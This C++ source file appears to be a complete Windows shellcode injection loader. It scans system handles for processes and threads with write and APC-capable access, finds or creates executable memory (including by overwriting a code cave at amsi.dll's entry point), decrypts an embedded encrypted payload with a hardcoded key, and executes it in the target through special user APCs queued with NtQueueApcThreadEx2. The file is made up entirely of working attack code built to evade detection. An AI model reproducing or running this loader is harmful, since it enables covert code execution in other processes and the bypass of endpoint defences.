#include <iostream>
#include <Windows.h>
//#include <Psapi.h>
#include <deque>
#include <thread>
#include <tlhelp32.h>
#include "Shcd.h"
//#include <winternl.h>
#include "MapFreeMemoryObjects.h"
#include "ProcessThreadPair.h"
#include "RWXFinder.h"
#include "InjectionCandidate.h"
#include "CustomWriteProcessMemory.h"
#include "FindThread.h"


using namespace std;

#pragma comment(lib, "ntdll.lib")

typedef PVOID PPS_APC_ROUTINE;

typedef NTSTATUS(NTAPI* pNtQueueApcThreadEx2_FIXED)(
	_In_ HANDLE ThreadHandle,
	_In_opt_ HANDLE ReserveHandle,
	_In_ ULONG ApcFlags,
	_In_ PPS_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcArgument1,
	_In_opt_ PVOID ApcArgument2,
	_In_opt_ PVOID ApcArgument3
	);


// Important to set the shellcode without null bytes for this to work, in msfvenom use -b "\x00"
unsigned char executableCode[] = "\x98\x00\x00\x00\xf9\x2f\x00\x00\x1b\x2d\x00\x00\xa8\x34\x00\x00\xe2\x04\x2b\xe9\xc5\xe2\x8b\xbc\xb7\xc6\x52\x31\x62\x6e\xb8\xf8\xc4\xee\xf0\x60\x40\xf4\xbc\x57\x72\xe3\xce\xf4\xa7\xde\x77\x3a\x32\x07\xc6\xf8\xa7\xb8\x82\x52\x14\x00\x1e\x0b\xba\xfc\xe0\x37\x00\xb8\x20\x5c\xe3\xfc\x8f\xc5\x1e\x03\x4f\xa6\x00\x80\x42\xce\xa6\x1a\x63\x63\xf5\x82\xd4\x9a\x9f\x90\x10\x5b\x60\x15\x84\x84\x53\xf4\xab\x5f\x49\x9d\x21\xae\xfd\xb6\x83\xe0\xb2\xe6\xd7\x16\x2b\xc2\xb9\x6c\x0a\xf2\xdb\x2e\x23\xe8\x5f\xec\x76\xfb\xad\xd7\xff\xb2\x02\x78\xc6\xce\x27\xc0\x1f\xcc\xfd\xab\xda\xd5\xb3\x8c\xb5\x49\xe0\x47\xc7\x20\x4b\x5f\x4b\x7a\x78\xcc\xc1\x44\x1b\x1f\x86\x10\x8d\x87\x89\x87\x78\x12\x91\xc6\xb5\x26\x94\x2b\xde\x68\xd7\x89\x4c\x6c\xdd\xc0\xab\x94\x6c\x94\x88\xac\x9c\xe6\x1a\x59\x3b\x73\x51\x72\xc5\x3f\x1f\x41\x18\x44\x85\x0a\x94\x11\xae\x56\xf2\xea\x69\x66\x0d\xcf\xa3\xfa\x90\x22\xca\x0f\xd1\x85\x53\xc2\x09\xba\xec\x0f\x99\xa5\x48\x66\xbb\x4c\xdc\xc8\x53\x34\xa4\xee\x05\x0d\x01\x53\x16\xe5\x56\xf7\xc6\x8e\x3c\x5c\xc0\x17\xdc\xe9\xc0\xe5\x9a\x66\xd5\xd5\xe2\x72\x9e\x8a\xac\x46\xc1\x44\x71\xaf\x6b\x2f\x4f\x81\x3e\xed\xc0\x00\xcf\xd2\xda\x83\xa1\xa6\x43\x77\x10\x06\xb2\x12\x05\x32\xc0\xc5\x6c\x65\x1b\x25\x61\xb3\x3e\x53\xd6\xf0\x91\x1e\xde\x3b\x1e\xc9\x3e\xdd\x69\xea\xe0\x2f\x57\xb6\xe8\xd0\x58\x14\x4c\x38\x12\x47\xa1\x26\x83\x3a\xe0\x9b\xfd\xb3\x56\x08\x9b\xc7\xb3\x3b\xf8\x7d\xcf\xe4\x75\xfc\xe9\x3a\x3c\xe9\x66\x02\x9d\x18\xaf\x4e\xfd\x90\x57\xe3\xd6\x38\x9c\xa5\x16\xe4\x80\xa9\x0a\x82\xd9\xc8\x6c\xfb\x97\xcf\x4c\x2d\x51\x04\xd5\xfc\x91\x8c\x99\x1a\x2d\xf9\x5a\xb9\xe3\x2d\x92\xc5\xca\x27\x8c\x65\x31\x8c\xcf\xf8\x79\x05\xef\x9d\x10\xca\x1a\x34\x22\x61\x1f\x5c\x6c\x07\x07\x18\x8d\xd6\x9c\x6d\x62\xb7\x94\x08\x78\x72\x60\xfb\xf2\x52\xd4\x66\xf9\x06\x08\x93\x95\x7c\x87\x08\xd4\xf6\x44\x1f\x03\xe5\xd4\x15\xa1\x6f\x60\x89\xeb\x08\x89\x6e\x8b\xd1\x43\x0b\x1a\xaf\xcc\x9b\xea\xb6\xb4\x6b\xda\x0b\xb8\x95\xf0\xca\x4a\xa9\xfa\x28\x53\x14\x10\x14\x6d\xf6\xc6\x7e\x9e\xff\xf5\xb3\x7b\xe2\x1b\x7d\xbf\x1c\x16\x52\x38\xfb\x31\xdc\x0d\x60\xfd\xbe\xb4\xd0\xd3\x5f\x3a\xbb\x63\xb3\xac\x8a\xd3\x62\x08\x48\xc1\x57\x86\x2c";

SIZE_T shellcodeSize = sizeof(executableCode);

int main(){
    // 1. Find a opened process
    MapMemoryObjects memoryObjects = MapMemoryObjects();
    PSYSTEM_HANDLE_INFORMATION memoryObjectList = memoryObjects.MapMemoryHandlers();
	deque<ProcessThreadPair> threads = memoryObjects.FindProcessThreadPairs(memoryObjectList, PROCESS_VM_WRITE | PROCESS_QUERY_LIMITED_INFORMATION, THREAD_SET_CONTEXT);

	if (threads.size() == 0) {
	//if (threads.size() != 0) {
		std::cout << "No processes + thread with required access found." << std::endl;
		// If no pair found, just use a process with required access, and then open manually a thread in it
		deque<HANDLE> processes = memoryObjects.FilterProcesses(memoryObjectList, PROCESS_VM_WRITE | PROCESS_QUERY_LIMITED_INFORMATION);
		if (processes.size() == 0) {
			std::cout << "No processes with required access found." << std::endl;
			return 1;
		}
		for (const auto& processHandle : processes) {
			//HANDLE threadHandle = getFirstThreadHandleByPID(GetProcessId(processHandle));
			HANDLE threadHandle = getNonMainOrAnyThreadHandleByPID(GetProcessId(processHandle));
			if (threadHandle != NULL) {
				ProcessThreadPair pair;
				pair.hProcess = processHandle;
				pair.hThread = threadHandle;
				pair.processId = GetProcessId(processHandle);
				pair.threadId = GetThreadId(threadHandle);
				threads.push_back(pair);
				std::cout << "Found process + thread with required access: PID " << pair.processId << " | TID " << pair.threadId << std::endl;
				break;
			}
		}
	}
	for (const auto& pair : threads) {
		std::cout << "Found process with required access: PID " << pair.processId << " | TID " << pair.threadId << std::endl;
	}

	// 2. Find a RWX memory region in the opened process
	InjectionCandidate candidate;
    bool found = false;
	bool firstTimeHere = false;
    for(const auto& pair : threads) {
        std::cout << "Process ID: " << pair.processId << " | Thread ID: " << pair.threadId << std::endl;
		candidate.processId = pair.processId;
		candidate.threadId = pair.threadId;
		candidate.hProcess = pair.hProcess;
		candidate.hThread = pair.hThread;
        LPVOID rwx = FindRWX(pair.hProcess, shellcodeSize);
        if (rwx) {
            std::cout << "Found RWX memory at: " << rwx << std::endl;
			candidate.rwxAddress = rwx;
			
			found = true;
			std::cout << "Using process ID: " << candidate.processId << " | Thread ID: " << candidate.threadId << " and RWX address: " << candidate.rwxAddress << std::endl;
            break;
        } else {
            std::cout << "No RWX memory found in process." << std::endl;
		}
	}
	if (!found) {
		// If no RWX memory found, allocate some
		LPVOID rwx = NULL;
        std::cout << "No RWX memory regions found in any opened processes." << std::endl;
		HMODULE hRemoteAmsi = GetRemoteModuleHandle(candidate.hProcess, "amsi.dll");
		if(hRemoteAmsi){
			std::cout << "Remote Amsi.dll module found at: " << hRemoteAmsi << std::endl;
			LPVOID amsiCave = GetAmsiEntryPointCave(candidate.hProcess, hRemoteAmsi);
			//LPVOID amsiCave = FindCodeCave(candidate.hProcess, hRemoteAmsi, shellcodeSize);
			DWORD oldProtection;
			bool resultVP = VirtualProtectEx(candidate.hProcess, amsiCave, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			if (resultVP) {
				rwx = amsiCave;
			}
		} else {
			std::cout << "Remote Amsi.dll module not found." << std::endl;
			rwx = VirtualAllocEx(candidate.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		}	


		if (rwx) {
			std::cout << "Allocated RWX memory at: " << rwx << std::endl;
			candidate.rwxAddress = rwx;
			found = true;
		}
		else {
			DWORD err = GetLastError();
			std::cout << "Failed to allocate RWX memory in process. Error: "
				<< err << std::endl;
			return 1;
		}
    }

	//2.1 Decrypt shellcode 
	unsigned char* payloadDec = decryptShellcode(executableCode, sizeof(executableCode), "f7Ea9C2b4D10xL8zQ5Wk3P6rIeG0jN7o");
	SIZE_T payloadDecLen = sizeof(executableCode);


	using resolvedNtQueueApcThreadEx2 = NTSTATUS(NTAPI*)(
		HANDLE ThreadHandle,
		HANDLE ReserveHandle,
		ULONG ApcFlags,
		PPS_APC_ROUTINE ApcRoutine,
		PVOID ApcArgument1,
		PVOID ApcArgument2,
		PVOID ApcArgument3
		);

	resolvedNtQueueApcThreadEx2 fNtQueueApcThreadEx2 = (resolvedNtQueueApcThreadEx2)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueueApcThreadEx2"));

    // 3. Write shellcode to the RWX memory region
	LPVOID rmtPointer = getPEBUnused(candidate.hProcess);
	LPVOID remoteAddress = CustomWriteProcessMemory(candidate.hProcess, payloadDec, payloadDecLen, rmtPointer);
	if (!remoteAddress) {
		std::cerr << "CustomWriteProcessMemory failed\n";
		SIZE_T bytesWritten;
		WriteProcessMemory(candidate.hProcess, candidate.rwxAddress, payloadDec, payloadDecLen, &bytesWritten);
	}

	DWORD atry = fNtQueueApcThreadEx2(candidate.hThread, NULL, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, (PPS_APC_ROUTINE)memcpy, (void*)candidate.rwxAddress, (void*)remoteAddress, (void*)payloadDecLen);
	cout << "GetThreadDescription NtQueueApcThreadEx2 result: " << hex << atry << endl;


	Sleep(3000);
	
	cout << "Candidate.rwxAddress: " << hex << candidate.rwxAddress << endl;

    // 4. Execute the shellcode with a openend thread using NtQueueApcThreadEx2
	DWORD res = fNtQueueApcThreadEx2(candidate.hThread, NULL, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
		(PPS_APC_ROUTINE)candidate.rwxAddress, NULL, NULL, NULL);

	
	cout << "NtQueueApcThreadEx2 result: " << hex << res << endl;

	getchar();
	return 0;
}
